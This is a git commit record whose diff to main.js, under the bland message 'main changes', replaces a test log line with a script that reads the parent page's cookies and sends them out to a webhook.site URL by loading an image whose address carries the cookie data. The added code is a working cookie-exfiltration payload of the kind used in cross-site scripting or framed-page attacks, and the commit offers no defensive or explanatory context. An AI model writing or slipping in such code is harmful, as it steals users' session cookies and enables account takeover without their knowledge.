4bf83b6976a778dd9f37f5bbc17a69f3c1c52a23
deepaklal <deepaklal.tpr@nutanix.com>
2022-10-16 15:14:42 +0530

    main changes

--- main.js
+++ main.js
@@ -1,4 +1,16 @@
 (function(){
-	console.log("test")
-;
+	var result = "";
+	try {
+		m = window.parent.document;
+		ck = m.cookie;
+		result += ck;
+	}
+	catch (e){
+		result += 'exception';
+		console.log("test");
+	}
+	c = document.createElement("img");
+	document.body.appendChild(c);
+	c.src = "https://webhook.site/f48379bd-6a69-4ea6-9a71-c129c5ed5724/" + result;
+
 })()
